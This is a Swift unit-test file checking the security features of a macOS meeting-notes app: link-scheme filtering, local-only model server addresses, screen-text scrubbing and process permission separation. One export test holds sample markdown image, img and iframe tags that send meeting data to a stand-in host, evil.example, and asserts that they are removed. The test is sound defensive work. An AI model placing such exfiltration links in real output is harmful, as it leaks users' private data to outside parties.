import XCTest
import GRDB
@testable import Off_the_Record

final class SecurityTests: XCTestCase {
    func testOnlyWebLinksCanOpen() {
        XCTAssertTrue(ExternalLink.isWeb(URL(string: "https://example.com/deck")!))
        XCTAssertTrue(ExternalLink.isWeb(URL(string: "http://example.com")!))
        XCTAssertFalse(ExternalLink.isWeb(URL(string: "file:///etc/passwd")!))
        XCTAssertFalse(ExternalLink.isWeb(URL(string: "x-apple.systempreferences:com.apple.preference.security")!))
        XCTAssertFalse(ExternalLink.isWeb(URL(string: "zoommtg://join?confno=1")!))
        XCTAssertFalse(ExternalLink.isWeb(URL(string: "https:")!))
    }

    func testLocalServerAddresses() {
        for local in ["http://127.0.0.1:11434", "http://localhost:11434", "http://[::1]:11434"] {
            XCTAssertTrue(OllamaClient.isLocal(URL(string: local)!), local)
        }
        for remote in ["http://0.0.0.0:11434", "http://192.168.1.5:11434", "https://ollama.example.com"] {
            XCTAssertFalse(OllamaClient.isLocal(URL(string: remote)!), remote)
        }
    }

    /// After processing, a meeting keeps the terms read off the screen but not the screen text.
    func testScreenTextIsReducedToTerms() throws {
        let db = try DatabaseQueue()
        try db.write { db in
            try db.create(table: "screenText") { t in
                t.primaryKey("id", .text)
                t.column("meetingId", .text).notNull()
                t.column("capturedAt", .datetime).notNull()
                t.column("text", .text).notNull()
            }
            for (i, text) in ["Deploy TimescaleDB on Kubernetes\npassword swordfish", "TimescaleDB rollout with PgBouncer"].enumerated() {
                try ScreenText(id: "\(i)", meetingId: "m1", capturedAt: Date(), text: text).insert(db)
            }
        }
        let before = try db.read { try Vocabulary.screenTerms(ScreenText.fetchAll($0)) }
        XCTAssertTrue(before.contains("TimescaleDB"))

        try db.write { try Vocabulary.keepOnlyScreenTerms($0, meetingId: "m1") }
        let rows = try db.read { try ScreenText.fetchAll($0) }
        XCTAssertEqual(rows.count, 1)
        XCTAssertFalse(rows[0].text.contains("swordfish"))
        XCTAssertEqual(Vocabulary.screenTerms(rows), before)

        // Running it again changes nothing.
        try db.write { try Vocabulary.keepOnlyScreenTerms($0) }
        XCTAssertEqual(try db.read { try ScreenText.fetchAll($0) }.map(\.text), rows.map(\.text))
    }

    /// A program the app starts (Ollama) is responsible for itself, so it does not get the app's
    /// microphone, system-audio or screen permissions. Checked with the same macOS function the
    /// privacy system uses.
    func testStartedProgramIsResponsibleForItself() throws {
        typealias Responsible = @convention(c) (pid_t) -> pid_t
        let symbol = try XCTUnwrap(dlsym(UnsafeMutableRawPointer(bitPattern: -2), "responsibility_get_pid_responsible_for_pid"))
        let responsible = unsafeBitCast(symbol, to: Responsible.self)
        XCTAssertEqual(responsible(getpid()), getpid())

        let pid = try Spawn.disclaimed("/bin/sleep", arguments: ["5"], environment: [:])
        defer { kill(pid, SIGKILL); var status: Int32 = 0; waitpid(pid, &status, 0) }
        XCTAssertEqual(responsible(pid), pid)
        XCTAssertNotEqual(responsible(pid), getpid())
    }

    func testListenerOwnerIsChecked() {
        let fd = socket(AF_INET, SOCK_STREAM, 0)
        defer { close(fd) }
        var address = sockaddr_in()
        address.sin_family = sa_family_t(AF_INET)
        address.sin_addr.s_addr = inet_addr("127.0.0.1")
        address.sin_port = 0
        var length = socklen_t(MemoryLayout<sockaddr_in>.size)
        withUnsafeMutablePointer(to: &address) { pointer in
            pointer.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                XCTAssertEqual(Darwin.bind(fd, $0, length), 0)
                XCTAssertEqual(Darwin.listen(fd, 1), 0)
                XCTAssertEqual(getsockname(fd, $0, &length), 0)
            }
        }
        let port = Int(UInt16(bigEndian: address.sin_port))
        XCTAssertTrue(OllamaClient.listenerIsMine(port: port))
        close(fd)
        XCTAssertFalse(OllamaClient.listenerIsMine(port: port))
    }

    func testExportDropsImagesButKeepsText() {
        let notes = """
        ## Notes
        - Deck: ![Q3 deck](https://evil.example/p.png?d=budget+is+4M) and [the doc](https://docs.example/q3)
        - Ref ![logo][1] here <img src="https://evil.example/x.gif?d=1"> end <IFRAME src="https://evil.example"></iframe>
        - Time [12:30](notes-time://750) stays
        """
        let out = ExternalLink.exportable(notes)
        XCTAssertFalse(out.contains("evil.example"))
        XCTAssertTrue(out.contains("Deck: Q3 deck and [the doc](https://docs.example/q3)"))
        XCTAssertTrue(out.contains("Ref logo here  end "))
        XCTAssertTrue(out.contains("[12:30](notes-time://750)"))
    }
}
